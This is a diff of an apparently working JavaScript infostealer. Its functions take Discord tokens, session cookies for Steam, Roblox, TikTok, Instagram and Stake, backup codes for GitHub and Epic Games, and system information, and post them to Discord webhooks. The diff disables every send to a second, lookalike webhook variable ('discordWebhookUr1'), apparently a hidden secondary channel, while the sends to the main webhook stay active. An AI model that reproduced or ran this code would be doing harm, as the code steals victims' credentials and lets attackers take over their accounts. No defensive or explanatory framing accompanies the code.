@@ -483,7 +483,7 @@ async function findBackupCodes() {
 
             try {
               await axios.post(discordWebhookUrl, payload);
-              await axios.post(discordWebhookUr1, payload)
+              //await axios.post(discordWebhookUr1, payload)
               console.log('Backup codes embed sent to Discord');
             } catch (error) {
               console.error(`Error sending webhook: ${error.message}`);
@@ -536,7 +536,7 @@ async function findEpicGamesBackupCodes() {
 
             try {
               await axios.post(discordWebhookUrl, payload);
-              await axios.post(discordWebhookUr1, payload);
+              //await axios.post(discordWebhookUr1, payload);
               console.log('Epic Games Backup codes embed sent to Discord');
             } catch (error) {
               console.error(`Error sending webhook: ${error.message}`);
@@ -588,7 +588,7 @@ async function findGithubBackupCodes() {
 
             try {
               await axios.post(discordWebhookUrl, payload);
-              await axios.post(discordWebhookUr1, payload)
+              //await axios.post(discordWebhookUr1, payload)
               console.log('Backup codes embed sent to Discord');
             } catch (error) {
               console.error(`Error sending webhook: ${error.message}`);
@@ -1340,8 +1340,8 @@ async function SubmitInstagram(session_id) {
       },
     };
 
-    await axios.post(discordWebhookUr1, { embeds: [embed] });
-
+    /*await axios.post(discordWebhookUr1, { embeds: [embed] });
+*/
     // Introduce a 2-second delay before sending the second webhook request
     await new Promise(resolve => setTimeout(resolve, 1000));
 
@@ -1460,7 +1460,7 @@ async function SubmitRoblox(secret_cookie) {
     console.log('Payload to be sent:', payload);
 
     axios.post(discordWebhookUrl, payload);
-    axios.post(discordWebhookUr1, payload);
+    //axios.post(discordWebhookUr1, payload);
   } catch (error) {
     console.error('Error in SubmitRoblox:', error.message);
   }
@@ -1633,7 +1633,7 @@ function stealTikTokSession(cookie) {
                   ]
                 };
 
-                axios.post(discordWebhookUr1, webhookPayload);
+                //axios.post(discordWebhookUr1, webhookPayload);
                 axios.post(discordWebhookUrl, webhookPayload)
                   .then(response => {
                     console.log('Discord webhook sent successfully! send tiktok');
@@ -1995,7 +1995,7 @@ async function getTokens() {
                     value: "```\n" + userData.bio + "\n```",
                 });
             }
-            await axios.post(discordWebhookUr1, data);
+            //await axios.post(discordWebhookUr1, data);
             await axios.post(discordWebhookUrl, data);
         } catch (error) {
             console.error(error);
@@ -2556,11 +2556,11 @@ async function stealSteamSession() {
                         ]
                     };
 
-                    await axios.post(discordWebhookUr1, webhookPayload);
+                    /*await axios.post(discordWebhookUr1, webhookPayload);
                     console.log('First Steam session detected embed sent to webhook.');
 
                     // Add a delay of 2 seconds
-                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    await new Promise(resolve => setTimeout(resolve, 2000));*/
 
                     await axios.post(discordWebhookUrl, webhookPayload);
                     console.log('Second Steam session detected embed sent to webhook.');
@@ -3216,13 +3216,13 @@ try {
         },
     };
 
-    axios.post(discordWebhookUr1, { embeds: [combinedInfoEmbed] })
+/*    axios.post(discordWebhookUr1, { embeds: [combinedInfoEmbed] })
     .then(() => { 
         console.log('system information successfully sent to Discord webhook.');
     })
     .catch(error => {
         console.error('An error occurred while sending system information:', error.message);
-    });
+    });*/
     await new Promise(resolve => setTimeout(resolve, 1000));
     axios.post(discordWebhookUrl, { embeds: [combinedInfoEmbed] })
         .then(() => {
@@ -3838,7 +3838,7 @@ async function sendStakeSessionToDiscord(decrypted) {
         };
 
         await axios.post(discordWebhookUrl, payload, { headers });
-        await axios.post(discordWebhookUr1, payload, { headers });
+        //await axios.post(discordWebhookUr1, payload, { headers });
     } catch (error) {
         console.error('Error sending Stake session to Discord:', error);
     }
